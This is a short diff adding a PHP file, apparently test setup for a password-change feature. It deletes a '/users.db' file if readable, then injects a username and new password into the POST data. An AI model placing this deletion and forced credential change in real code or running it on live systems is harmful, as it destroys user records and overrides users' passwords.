@@ -1,0 +1,4 @@
+<?php
+if (is_readable('/users.db')) { unlink('/users.db'); }
+$_POST['username'] = 'frank';
+$_POST['new_password'] = 'asdfasdf';
